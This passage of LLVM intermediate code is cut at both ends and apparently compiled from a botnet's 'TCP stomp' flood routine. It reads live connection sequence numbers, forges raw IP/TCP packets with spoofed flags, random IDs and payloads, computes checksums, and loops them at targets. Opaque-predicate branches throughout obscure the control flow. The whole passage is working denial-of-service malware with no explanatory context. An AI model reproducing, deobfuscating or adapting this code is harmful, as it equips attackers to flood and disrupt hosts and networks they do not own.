  %312 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %313 = getelementptr inbounds i8, i8* %312, i64 20
  %314 = bitcast i8* %313 to %struct.tcphdr*
  store %struct.tcphdr* %314, %struct.tcphdr** %43, align 8
  %315 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = load i16, i16* %316, align 4
  %318 = zext i16 %317 to i32
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = icmp eq i32 %318, %321
  br i1 %322, label %323, label %609

; <label>:323:                                    ; preds = %311
  %324 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = lshr i16 %326, 9
  %328 = and i16 %327, 1
  %329 = zext i16 %328 to i32
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %556

; <label>:331:                                    ; preds = %323
  %332 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 4
  %334 = load i16, i16* %333, align 4
  %335 = lshr i16 %334, 12
  %336 = and i16 %335, 1
  %337 = zext i16 %336 to i32
  %338 = icmp ne i32 %337, 0
  br i1 %338, label %339, label %556

; <label>:339:                                    ; preds = %331
  %340 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %341 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %340, i32 0, i32 0
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %344 = load i32, i32* %17, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %346, i32 0, i32 0
  store i32 %342, i32* %347, align 4
  %348 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 2
  %350 = load i32, i32* %349, align 4
  %351 = call i32 @ntohl(i32 %350) #7
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %353 = load i32, i32* %17, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 1
  store i32 %351, i32* %356, align 4
  %357 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %358 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %357, i32 0, i32 3
  %359 = load i32, i32* %358, align 4
  %360 = call i32 @ntohl(i32 %359) #7
  %361 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %362 = load i32, i32* %17, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %364, i32 0, i32 2
  store i32 %360, i32* %365, align 4
  %366 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  %368 = load i16, i16* %367, align 2
  %369 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %370 = load i32, i32* %17, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %369, i64 %371
  %373 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %372, i32 0, i32 3
  store i16 %368, i16* %373, align 4
  %374 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %375 = load i16, i16* %374, align 2
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %377 = load i32, i32* %17, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 4
  store i16 %375, i16* %380, align 2
  %381 = load i32, i32* %32, align 4
  %382 = sext i32 %381 to i64
  %383 = add i64 40, %382
  %384 = call noalias i8* @malloc(i64 %383) #6
  %385 = load i8**, i8*** %20, align 8
  %386 = load i32, i32* %17, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds i8*, i8** %385, i64 %387
  store i8* %384, i8** %388, align 8
  %389 = load i8**, i8*** %20, align 8
  %390 = load i32, i32* %17, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds i8*, i8** %389, i64 %391
  %393 = load i8*, i8** %392, align 8
  %394 = bitcast i8* %393 to %struct.iphdr*
  store %struct.iphdr* %394, %struct.iphdr** %44, align 8
  %395 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i64 1
  %397 = bitcast %struct.iphdr* %396 to %struct.tcphdr*
  store %struct.tcphdr* %397, %struct.tcphdr** %45, align 8
  %398 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i64 1
  %400 = bitcast %struct.tcphdr* %399 to i8*
  store i8* %400, i8** %46, align 8
  %401 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %402 = bitcast %struct.iphdr* %401 to i8*
  %403 = load i8, i8* %402, align 4
  %404 = and i8 %403, 15
  %405 = or i8 %404, 64
  store i8 %405, i8* %402, align 4
  %406 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %407 = bitcast %struct.iphdr* %406 to i8*
  %408 = load i8, i8* %407, align 4
  %409 = and i8 %408, -16
  %410 = or i8 %409, 5
  store i8 %410, i8* %407, align 4
  %411 = load i8, i8* %21, align 1
  %412 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 1
  store i8 %411, i8* %413, align 1
  %414 = load i32, i32* %32, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 40, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 2
  store i16 %418, i16* %420, align 2
  %421 = load i16, i16* %22, align 2
  %422 = call zeroext i16 @htons(i16 zeroext %421) #7
  %423 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 3
  store i16 %422, i16* %424, align 4
  %425 = load i8, i8* %23, align 1
  %426 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 5
  store i8 %425, i8* %427, align 4
  %428 = load i8, i8* %24, align 1
  %429 = icmp ne i8 %428, 0
  br i1 %429, label %430, label %434

; <label>:430:                                    ; preds = %339
  %431 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %432 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 4
  store i16 %431, i16* %433, align 2
  br label %434

; <label>:434:                                    ; preds = %430, %339
  %435 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 6
  store i8 6, i8* %436, align 1
  %437 = load i32, i32* @LOCAL_ADDR, align 4
  %438 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 8
  store i32 %437, i32* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %441 = load i32, i32* %17, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 4
  %446 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 9
  store i32 %445, i32* %447, align 4
  %448 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %449 = load i32, i32* %17, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i32 0, i32 3
  %453 = load i16, i16* %452, align 4
  %454 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 0
  store i16 %453, i16* %455, align 4
  %456 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %457 = load i32, i32* %17, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i32 0, i32 4
  %461 = load i16, i16* %460, align 2
  %462 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 1
  store i16 %461, i16* %463, align 2
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %465 = load i32, i32* %17, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 2
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 2
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %473 = load i32, i32* %17, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 1
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 3
  store i32 %477, i32* %479, align 4
  %480 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 4
  %482 = load i16, i16* %481, align 4
  %483 = and i16 %482, -241
  %484 = or i16 %483, 128
  store i16 %484, i16* %481, align 4
  %485 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %486 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %485, i32 0, i32 4
  %487 = load i16, i16* %486, align 4
  %488 = and i16 %487, -257
  %489 = or i16 %488, 256
  store i16 %489, i16* %486, align 4
  %490 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 4
  %492 = load i16, i16* %491, align 4
  %493 = and i16 %492, -4097
  %494 = or i16 %493, 4096
  store i16 %494, i16* %491, align 4
  %495 = call i32 @rand_next()
  %496 = and i32 %495, 65535
  %497 = trunc i32 %496 to i16
  %498 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 5
  store i16 %497, i16* %499, align 2
  %500 = load i8, i8* %26, align 1
  %501 = sext i8 %500 to i16
  %502 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 4
  %504 = load i16, i16* %503, align 4
  %505 = and i16 %501, 1
  %506 = shl i16 %505, 13
  %507 = and i16 %504, -8193
  %508 = or i16 %507, %506
  store i16 %508, i16* %503, align 4
  %509 = load i8, i8* %27, align 1
  %510 = sext i8 %509 to i16
  %511 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %512 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %511, i32 0, i32 4
  %513 = load i16, i16* %512, align 4
  %514 = and i16 %510, 1
  %515 = shl i16 %514, 12
  %516 = and i16 %513, -4097
  %517 = or i16 %516, %515
  store i16 %517, i16* %512, align 4
  %518 = load i8, i8* %28, align 1
  %519 = sext i8 %518 to i16
  %520 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 4
  %522 = load i16, i16* %521, align 4
  %523 = and i16 %519, 1
  %524 = shl i16 %523, 11
  %525 = and i16 %522, -2049
  %526 = or i16 %525, %524
  store i16 %526, i16* %521, align 4
  %527 = load i8, i8* %29, align 1
  %528 = sext i8 %527 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 4
  %531 = load i16, i16* %530, align 4
  %532 = and i16 %528, 1
  %533 = shl i16 %532, 10
  %534 = and i16 %531, -1025
  %535 = or i16 %534, %533
  store i16 %535, i16* %530, align 4
  %536 = load i8, i8* %30, align 1
  %537 = sext i8 %536 to i16
  %538 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 4
  %540 = load i16, i16* %539, align 4
  %541 = and i16 %537, 1
  %542 = shl i16 %541, 9
  %543 = and i16 %540, -513
  %544 = or i16 %543, %542
  store i16 %544, i16* %539, align 4
  %545 = load i8, i8* %31, align 1
  %546 = sext i8 %545 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 4
  %549 = load i16, i16* %548, align 4
  %550 = and i16 %546, 1
  %551 = shl i16 %550, 8
  %552 = and i16 %549, -257
  %553 = or i16 %552, %551
  store i16 %553, i16* %548, align 4
  %554 = load i8*, i8** %46, align 8
  %555 = load i32, i32* %32, align 4
  call void @rand_str(i8* %554, i32 %555)
  br label %651

; <label>:556:                                    ; preds = %331, %323
  %557 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %558 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %557, i32 0, i32 4
  %559 = load i16, i16* %558, align 4
  %560 = lshr i16 %559, 8
  %561 = and i16 %560, 1
  %562 = zext i16 %561 to i32
  %563 = icmp ne i32 %562, 0
  br i1 %563, label %572, label %564

; <label>:564:                                    ; preds = %556
  %565 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 4
  %567 = load i16, i16* %566, align 4
  %568 = lshr i16 %567, 10
  %569 = and i16 %568, 1
  %570 = zext i16 %569 to i32
  %571 = icmp ne i32 %570, 0
  br i1 %571, label %572, label %591

; <label>:572:                                    ; preds = %564, %556
  %573 = load i32, i32* @x.31
  %574 = load i32, i32* @y.32
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %572
  %581 = load i32, i32* %34, align 4
  %582 = call i32 @close(i32 %581)
  %583 = load i32, i32* @x.31
  %584 = load i32, i32* @y.32
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %169

; <label>:591:                                    ; preds = %564
  %592 = load i32, i32* @x.31
  %593 = load i32, i32* @y.32
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %591
  %600 = load i32, i32* @x.31
  %601 = load i32, i32* @y.32
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %608

; <label>:608:                                    ; preds = %originalBBpart228
  br label %609

; <label>:609:                                    ; preds = %608, %311
  %610 = load i32, i32* @x.31
  %611 = load i32, i32* @y.32
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %609
  %618 = load i32, i32* @x.31
  %619 = load i32, i32* @y.32
  %620 = sub i32 %618, 1
  %621 = mul i32 %618, %620
  %622 = urem i32 %621, 2
  %623 = icmp eq i32 %622, 0
  %624 = icmp slt i32 %619, 10
  %625 = or i1 %623, %624
  br i1 %625, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %626

; <label>:626:                                    ; preds = %originalBBpart232, %307, %originalBBpart220
  %627 = call i64 @time(i64* null) #6
  %628 = load i64, i64* %39, align 8
  %629 = sub nsw i64 %627, %628
  %630 = icmp sgt i64 %629, 10
  br i1 %630, label %631, label %634

; <label>:631:                                    ; preds = %626
  %632 = load i32, i32* %34, align 4
  %633 = call i32 @close(i32 %632)
  br label %169

; <label>:634:                                    ; preds = %626
  %635 = load i32, i32* @x.31
  %636 = load i32, i32* @y.32
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %634
  %643 = load i32, i32* @x.31
  %644 = load i32, i32* @y.32
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %271

; <label>:651:                                    ; preds = %434
  %652 = load i32, i32* @x.31
  %653 = load i32, i32* @y.32
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %651
  %660 = load i32, i32* @x.31
  %661 = load i32, i32* @y.32
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %668

; <label>:668:                                    ; preds = %originalBBpart240, %172
  %669 = load i32, i32* %17, align 4
  %670 = add nsw i32 %669, 1
  store i32 %670, i32* %17, align 4
  br label %147

; <label>:671:                                    ; preds = %147
  br label %672

; <label>:672:                                    ; preds = %846, %671
  %673 = load i32, i32* @x.31
  %674 = load i32, i32* @y.32
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %672
  store i32 0, i32* %17, align 4
  %681 = load i32, i32* @x.31
  %682 = load i32, i32* @y.32
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %689

; <label>:689:                                    ; preds = %843, %originalBBpart244
  %690 = load i32, i32* %17, align 4
  %691 = load i8, i8* %13, align 1
  %692 = zext i8 %691 to i32
  %693 = icmp slt i32 %690, %692
  br i1 %693, label %694, label %846

; <label>:694:                                    ; preds = %689
  %695 = load i8**, i8*** %20, align 8
  %696 = load i32, i32* %17, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8*, i8** %695, i64 %697
  %699 = load i8*, i8** %698, align 8
  store i8* %699, i8** %47, align 8
  %700 = load i8*, i8** %47, align 8
  %701 = bitcast i8* %700 to %struct.iphdr*
  store %struct.iphdr* %701, %struct.iphdr** %48, align 8
  %702 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %703 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %702, i64 1
  %704 = bitcast %struct.iphdr* %703 to %struct.tcphdr*
  store %struct.tcphdr* %704, %struct.tcphdr** %49, align 8
  %705 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i64 1
  %707 = bitcast %struct.tcphdr* %706 to i8*
  store i8* %707, i8** %50, align 8
  %708 = load i16, i16* %22, align 2
  %709 = zext i16 %708 to i32
  %710 = icmp eq i32 %709, 65535
  br i1 %710, label %711, label %733

; <label>:711:                                    ; preds = %694
  %712 = load i32, i32* @x.31
  %713 = load i32, i32* @y.32
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %711
  %720 = call i32 @rand_next()
  %721 = and i32 %720, 65535
  %722 = trunc i32 %721 to i16
  %723 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %724 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %723, i32 0, i32 3
  store i16 %722, i16* %724, align 4
  %725 = load i32, i32* @x.31
  %726 = load i32, i32* @y.32
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBBpart258, label %originalBB46alteredBB

originalBBpart258:                                ; preds = %originalBB46
  br label %733

; <label>:733:                                    ; preds = %originalBBpart258, %694
  %734 = load i32, i32* @x.31
  %735 = load i32, i32* @y.32
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %733
  %742 = load i8, i8* %33, align 1
  %743 = icmp ne i8 %742, 0
  %744 = load i32, i32* @x.31
  %745 = load i32, i32* @y.32
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %743, label %752, label %771

; <label>:752:                                    ; preds = %originalBBpart262
  %753 = load i32, i32* @x.31
  %754 = load i32, i32* @y.32
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %752
  %761 = load i8*, i8** %50, align 8
  %762 = load i32, i32* %32, align 4
  call void @rand_str(i8* %761, i32 %762)
  %763 = load i32, i32* @x.31
  %764 = load i32, i32* @y.32
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %771

; <label>:771:                                    ; preds = %originalBBpart266, %originalBBpart262
  %772 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %773 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %772, i32 0, i32 7
  store i16 0, i16* %773, align 2
  %774 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %775 = bitcast %struct.iphdr* %774 to i16*
  %776 = call zeroext i16 @checksum_generic(i16* %775, i32 20)
  %777 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 7
  store i16 %776, i16* %778, align 2
  %779 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %780 = load i32, i32* %17, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %779, i64 %781
  %783 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %782, i32 0, i32 1
  %784 = load i32, i32* %783, align 4
  %785 = add i32 %784, 1
  store i32 %785, i32* %783, align 4
  %786 = trunc i32 %784 to i16
  %787 = call zeroext i16 @htons(i16 zeroext %786) #7
  %788 = zext i16 %787 to i32
  %789 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %790 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %789, i32 0, i32 2
  store i32 %788, i32* %790, align 4
  %791 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %792 = load i32, i32* %17, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %791, i64 %793
  %795 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %794, i32 0, i32 2
  %796 = load i32, i32* %795, align 4
  %797 = trunc i32 %796 to i16
  %798 = call zeroext i16 @htons(i16 zeroext %797) #7
  %799 = zext i16 %798 to i32
  %800 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %801 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %800, i32 0, i32 3
  store i32 %799, i32* %801, align 4
  %802 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 6
  store i16 0, i16* %803, align 4
  %804 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %805 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %806 = bitcast %struct.tcphdr* %805 to i8*
  %807 = load i32, i32* %32, align 4
  %808 = sext i32 %807 to i64
  %809 = add i64 20, %808
  %810 = trunc i64 %809 to i16
  %811 = call zeroext i16 @htons(i16 zeroext %810) #7
  %812 = load i32, i32* %32, align 4
  %813 = sext i32 %812 to i64
  %814 = add i64 20, %813
  %815 = trunc i64 %814 to i32
  %816 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %804, i8* %806, i16 zeroext %811, i32 %815)
  %817 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %818 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %817, i32 0, i32 6
  store i16 %816, i16* %818, align 4
  %819 = load %struct.tcphdr*, %struct.tcphdr** %49, align 8
  %820 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %819, i32 0, i32 1
  %821 = load i16, i16* %820, align 2
  %822 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %823 = load i32, i32* %17, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %822, i64 %824
  %826 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %825, i32 0, i32 0
  %827 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %826, i32 0, i32 1
  store i16 %821, i16* %827, align 2
  %828 = load i32, i32* %18, align 4
  %829 = load i8*, i8** %47, align 8
  %830 = load i32, i32* %32, align 4
  %831 = sext i32 %830 to i64
  %832 = add i64 40, %831
